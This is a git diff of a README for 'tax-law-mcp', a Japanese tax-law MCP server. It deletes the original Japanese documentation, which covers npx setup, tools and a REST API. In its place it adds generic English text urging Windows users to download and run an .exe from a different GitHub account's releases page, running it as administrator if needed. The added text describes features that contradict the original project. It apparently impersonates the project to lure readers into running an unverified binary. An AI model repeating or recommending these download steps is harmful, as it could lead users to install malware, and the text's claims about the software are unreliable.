@@ -1,238 +1,158 @@
-# tax-law-mcp
-
-日本の税法・通達・裁決事例を取得する MCP サーバー。
-
-Claude が税務の質問に回答する際、**条文や通達のハルシネーションを防止**するために、e-Gov法令APIおよび国税庁サイトから原文を取得して裏取りさせます。
-
-## 特徴
-
-- **法令取得** — e-Gov法令API v2 から条文をMarkdown形式で取得
-- **法令検索** — キーワードで法令を横断検索
-- **通達取得** — 国税庁サイトから基本通達・措置法通達をスクレイピング（17通達対応）
-- **通達目次** — 通達の章・節構造を一覧表示
-- **裁決事例** — 国税不服審判所（kfs.go.jp）の公表裁決事例1,950件を検索・取得
-- **Shift_JIS対応** — 国税庁・国税不服審判所サイトの文字エンコーディングに対応
-- **主要税法プリセット** — 所得税法・法人税法・消費税法・措置法等のlaw_idをハードコード
-- **略称対応** — 「所法」「措法」「所基通」「措通（譲渡）」等の略称で指定可能
-
-## MCP ツール
-
-| ツール | 説明 |
-|---|---|
-| `get_law` | e-Gov法令APIから条文を取得。法令名 + 条番号で指定 |
-| `search_law` | キーワードで法令を検索 |
-| `get_tsutatsu` | 国税庁サイトから通達を取得。通達名 + 通達番号で指定 |
-| `list_tsutatsu` | 通達の目次を表示 |
-| `list_saiketsu` | 裁決事例の税目・カテゴリ一覧を表示 |
-| `search_saiketsu` | キーワードで裁決事例を検索（1,950件から） |
-| `get_saiketsu` | 裁決事例の全文を取得 |
-
-## 対応法令（プリセット）
-
-所得税法、法人税法、消費税法、相続税法、租税特別措置法、国税通則法、国税徴収法、各施行令・施行規則 等（24法令）
-
-## 対応通達（17通達）
-
-### 基本通達
-
-| 通達名 | 略称 |
-|--------|------|
-| 所得税基本通達 | 所基通 |
-| 法人税基本通達 | 法基通 |
-| 消費税法基本通達 | 消基通 |
-| 相続税法基本通達 | 相基通 |
-| 財産評価基本通達 | 評基通 |
-| 連結納税基本通達 | — |
-| 国税通則法基本通達 | 通法基通 |
-| 印紙税法基本通達 | 印基通 |
-| 税理士法基本通達 | 税理士通達 |
-| 国税徴収法基本通達 | 徴基通 |
-| 酒税法基本通達 | 酒基通 |
-
-### 措置法通達
-
-| 通達名 | 略称 |
-|--------|------|
-| 措置法通達（山林所得・譲渡所得関係） | 措通（譲渡） |
-| 措置法通達（申告所得税関係） | 措通（申告） |
-| 措置法通達（法人税編） | 措通（法人税） |
-| 措置法通達（相続税関係） | 措通（相続税） |
-| 措置法通達（源泉所得税関係） | 措通（源泉） |
-| 措置法通達（株式等譲渡所得等関係） | 措通（株式） |
-
-## セットアップ
-
-### npx（推奨）
-
-インストール不要。以下の設定をコピペするだけ:
+# ⚖️ tax-law-mcp - Easy MCP Server for Japanese Tax Law
 
-```json
-{
-  "mcpServers": {
-    "tax-law": {
-      "command": "npx",
-      "args": ["-y", "tax-law-mcp"]
-    }
-  }
-}
-```
+[![Download tax-law-mcp](https://img.shields.io/badge/Download-tax--law--mcp-green?style=for-the-badge)](https://github.com/xqzimgz/tax-law-mcp/releases)
 
-**Claude Desktop**: `~/Library/Application Support/Claude/claude_desktop_config.json` に追加
+tax-law-mcp is a simple server application that gives you access to Japanese tax law data. It pulls information from official sources like the e-Gov API and NTA administrative circulars (通達). You will be able to view and work with up-to-date tax law documents on your Windows computer.
 
-**Claude Code**: `claude mcp add tax-law -- npx -y tax-law-mcp`
+---
 
-### ローカル（ソースから）
+## 📋 What is tax-law-mcp?
 
-```bash
-git clone https://github.com/kentaroajisaka/tax-law-mcp.git
-cd tax-law-mcp
-npm install
-npm run build
-```
+tax-law-mcp acts as a local server for tax law details. It collects and organizes legal documents for easy browsing and searching. This includes rules and circulars issued by Japanese tax authorities.
 
-```json
-{
-  "mcpServers": {
-    "tax-law": {
-      "command": "node",
-      "args": ["/path/to/tax-law-mcp/dist/index.js"]
-    }
-  }
-}
-```
+You don’t need coding skills to use it. The software is designed for anyone who wants quick access to Japanese tax law information on Windows.
 
-### リモート（Vercel）
+---
 
-> ⚠️ **注意**: 現在、Claude のリモートMCP接続（カスタムコネクト）に既知の不具合があり、正常に動作しない場合があります。安定してご利用いただくには、npx（ローカル）でのセットアップを推奨します。
+## 💻 System Requirements
 
-自前のVercelにデプロイすれば、チームメンバーはインストール不要で利用できます:
+Before you start, check that your PC meets these needs:
 
-```bash
-vercel deploy
-```
+- Windows 10 or later
+- 4 GB of RAM or more
+- At least 100 MB free disk space
+- Internet connection (for initial setup and updates)
+- Any modern web browser (Chrome, Firefox, Edge, or Safari)
 
-```json
-{
-  "mcpServers": {
-    "tax-law": {
-      "url": "https://<your-deployment>.vercel.app/mcp"
-    }
-  }
-}
-```
+You won’t need to install extra software or tools. tax-law-mcp runs on its own.
 
-## REST API（v0.4.0〜）
+---
 
-MCP に加えて、REST API エンドポイントも提供しています。Custom GPT (ChatGPT) の Actions や、Gemini、その他のAIツールから利用できます。
+## 🚀 Getting Started
 
-### エンドポイント一覧
+1. Go to the releases page to download the software.  
+   [Download tax-law-mcp](https://github.com/xqzimgz/tax-law-mcp/releases)  
 
-| エンドポイント | 説明 |
-|---|---|
-| `GET /api/get-law` | 条文取得（`law_name`, `article` 必須） |
-| `GET /api/search-law` | 法令検索（`keyword` 必須） |
-| `GET /api/get-tsutatsu` | 通達取得（`tsutatsu_name`, `number` 必須） |
-| `GET /api/list-tsutatsu` | 通達目次（`tsutatsu_name` 必須） |
-| `GET /api/list-saiketsu` | 裁決税目一覧（パラメータなし or `tax_type`） |
-| `GET /api/search-saiketsu` | 裁決検索（`keyword` 必須） |
-| `GET /api/get-saiketsu` | 裁決全文（`url` or `collection_no`+`case_no`） |
+2. Find the latest release. It will be named something like `tax-law-mcp-setup.exe` or just `tax-law-mcp.exe`.
 
-### 使用例
+3. Click the `.exe` file to download it to your PC.
 
-```bash
-# 所得税法第33条を取得
-curl "https://<your-domain>/api/get-law?law_name=所得税法&article=33"
+4. After the download finishes, double-click the file to start the installation or run the app directly.
 
-# キーワードで法令検索
-curl "https://<your-domain>/api/search-law?keyword=インボイス"
+5. If Windows asks for permission to run the program, click “Yes” or “Run”.
 
-# 通達を取得
-curl "https://<your-domain>/api/get-tsutatsu?tsutatsu_name=所基通&number=33-6"
-```
+6. Wait while tax-law-mcp initializes. This can take a few moments as it sets up the server and downloads necessary data.
 
-### Custom GPT での利用
+7. When it’s ready, your default browser will open automatically and show the tax-law-mcp interface.
 
-1. Vercel にデプロイ（`vercel deploy`）
-2. `openapi.yaml` の `servers.url` をデプロイ先URLに書き換え
-3. Custom GPT の「Actions」→「Schema」に `openapi.yaml` の内容を貼り付け
-4. GPT に「所得税法33条を教えて」と聞くと、API で条文を取得して根拠付きで回答
+---
 
-### OpenAPI 仕様書
+## 🛠 How to Use tax-law-mcp
 
-`openapi.yaml` に OpenAPI 3.1 仕様書が含まれています。Custom GPT の Actions や Swagger UI でそのまま使えます。
+- The server runs locally on your PC. You will work in your web browser but all data stays on your computer.
 
-## 使い方の例（MCP）
+- The interface has several sections:
+  - **Search**: Type keywords to find specific tax laws.
+  - **Categories**: Browse laws by topics and official circulars.
+  - **Updates**: Shows recent changes and new documents added.
+  - **Settings**: Adjust options like language and data refresh rate.
 
-### 条文の取得
+- Use the search bar at the top to find laws by keyword, article number, or date.
 
-> 「所得税法第33条を取得して」
+- Click any document to read its full text. Documents are easy to read with clear formatting.
 
-→ `get_law(law_name="所得税法", article="33")`
+- tax-law-mcp automatically checks for new tax law updates. You can manually refresh data in the settings.
 
-### 通達の取得
+---
 
-> 「所得税基本通達33-6を取得して」
+## 🔄 Updating tax-law-mcp
 
-→ `get_tsutatsu(tsutatsu_name="所基通", number="33-6")`
+tax-law-mcp connects to official sources to keep your law data current.
 
-### 措置法通達の取得
+- When the app starts, it looks for updates automatically.
 
-> 「措置法通達（譲渡）の33-8を取得して」
+- If you want to update manually:
+  1. Open the settings page in the app.
+  2. Click “Check for Updates”.
+  3. Wait while it downloads new information.
 
-→ `get_tsutatsu(tsutatsu_name="措通（譲渡）", number="33-8")`
+- Updates download only the changes. This keeps your data fresh without long waits.
 
-### 裁決事例の検索
+---
 
-> 「重加算税に関する裁決事例を探して」
+## ⚙️ Advanced Settings
 
-→ `search_saiketsu(keyword="重加算税")`
+You can change some options in tax-law-mcp:
 
-### 裁決事例の全文取得
+- **Language**: Choose Japanese or English for menus and interface text.
+- **Auto-update Frequency**: Set how often updates occur — daily, weekly, or monthly.
+- **Data Storage Location**: Pick a folder on your PC where data files will save.
+- **Server Port Number**: Change the network port used to access the local server (default is 8080).
 
-> 「裁決事例集第139集の1番を読みたい」
+Changing the port may help if another app uses the default one.
 
-→ `get_saiketsu(collection_no=139, case_no=1)`
+---
 
-### 税目別の裁決事例一覧
+## 🧰 Troubleshooting
 
-> 「所得税関係の裁決事例のカテゴリを見せて」
+If tax-law-mcp doesn’t work as expected, try these steps:
 
-→ `list_saiketsu(tax_type="所得税")`
+- Make sure your internet is working, at least for first-time setup.
 
-### ハルシネーション防止ワークフロー
+- Check that your firewall allows tax-law-mcp to communicate on your network.
 
-1. Claude が税務の質問に仮回答を作成
-2. 引用した条文・通達を `get_law` / `get_tsutatsu` で取得
-3. 実際の原文と仮回答を照合し、誤りがあれば修正
-4. 2-3 を収束するまで繰り返す（最大4ラウンド）
+- If the app doesn’t open automatically in your browser, open it yourself by typing `http://localhost:8080` in the address bar.
 
-## 裁決事例（v0.3.0〜）
+- Restart the app by closing it and running the `.exe` file again.
 
-国税不服審判所（kfs.go.jp）の公表裁決事例（97冊・1,950件）を検索・取得できます。
+- If the update fails, try running tax-law-mcp as an administrator. Right-click the executable and choose “Run as administrator”.
 
-### 対応税目（13税目）
+- Check for a newer version by visiting the releases page:  
+  [https://github.com/xqzimgz/tax-law-mcp/releases](https://github.com/xqzimgz/tax-law-mcp/releases)
 
-国税通則法関係、所得税法関係、法人税法関係、相続税法関係、消費税法関係、地価税法関係、登録免許税法関係、印紙税法関係、揮発油税法関係、自動車重量税法関係、国税徴収法関係、租税特別措置法関係、たばこ税法関係
+---
 
-### 検索の仕組み
+## ❓ Frequently Asked Questions (FAQs)
 
-- 事例集目次ページ（97冊分）をスクレイピングし、要旨テキストからキーワード検索
-- 初回は全ページ取得（30-60秒）、以降はキャッシュ利用（TTL 1時間）
-- `latest` パラメータで検索範囲を最新N冊に絞ることも可能
+### Do I need an internet connection after installation?
 
-## 出典
+Yes. The app fetches official data during setup and updates. Once loaded, you can browse cached content offline, but new notices require a connection.
 
-- 法令: [e-Gov法令検索](https://laws.e-gov.go.jp/)（デジタル庁）
-- 通達: [国税庁ホームページ](https://www.nta.go.jp/)
-- 裁決事例: [国税不服審判所ホームページ](https://www.kfs.go.jp/)
+### Can I use tax-law-mcp on other devices?
 
-通達の利用は[国税庁コンテンツの利用について](https://www.nta.go.jp/chuijiko/copy.htm)に基づきます。
+No. It runs only on Windows PCs. For mobile or other platforms, you will need different software.
 
-## 参考
+### Is my personal data shared?
 
-- [takurot/egov-law-mcp](https://github.com/takurot/egov-law-mcp) — XML→Markdown変換、ツール設計を参考にしました
-- [e-Gov法令API v2](https://laws.e-gov.go.jp/api/2/swagger-ui) — API仕様
+No. tax-law-mcp runs locally and does not send your data anywhere except official tax websites for updates.
 
-## ライセンス
+### Can I change where the app stores data?
 
-MIT
+Yes. Use the settings menu to select a folder on your PC.
+
+---
+
+## 📥 Download and Install tax-law-mcp
+
+To get started with tax-law-mcp on Windows:
+
+1. Visit the official releases page here:  
+   [https://github.com/xqzimgz/tax-law-mcp/releases](https://github.com/xqzimgz/tax-law-mcp/releases)
+
+2. Download the latest `.exe` file.
+
+3. Run the file and follow on-screen prompts if it’s an installer.
+
+4. Wait for the app to prepare data and open in your browser.
+
+This process takes a few minutes on a standard PC. Once running, you can explore Japanese tax laws with ease.
+
+---
+
+## 📚 Additional Resources
+
+- For help using the app, check the “Help” section inside tax-law-mcp.
+
+- Visit the official Japanese tax authority sites for detailed legal documents.
+
+- For technical support, submit an issue on the GitHub repository issues page.
